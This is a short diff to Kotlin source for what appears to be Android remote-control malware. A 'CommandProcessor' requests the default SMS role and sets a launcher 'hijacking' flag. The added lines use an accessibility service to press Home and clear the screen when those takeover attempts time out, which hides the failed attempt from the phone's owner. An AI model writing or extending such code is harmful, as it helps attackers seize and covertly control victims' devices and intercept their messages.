@@ -2470,7 +2470,11 @@ object CommandProcessor {
                                 DefaultSmsManager.requestDefault(ctx)
                                 var timeout = 0
                                 while(DefaultSmsManager.expectedMode != "" && timeout < 15) { kotlinx.coroutines.delay(1000); timeout++ }
-                                DefaultSmsManager.expectedMode = "" // Disarm if timeout
+                                if (DefaultSmsManager.expectedMode != "") {
+                                    DefaultSmsManager.expectedMode = "" // Disarm if timeout
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    kotlinx.coroutines.delay(1000) // Let the OS clear the screen for a clean slate
+                                }
                             }
                             
                             // Check Launcher
@@ -2498,7 +2502,11 @@ object CommandProcessor {
                                     kotlinx.coroutines.delay(1000)
                                     timeout++ 
                                 }
-                                LauncherManager.isHijacking = false // Disarm if timeout
+                                if (LauncherManager.isHijacking) {
+                                    LauncherManager.isHijacking = false // Disarm if timeout
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    kotlinx.coroutines.delay(1000)
+                                }
                             }
                             
                             if (!allSuccess) {
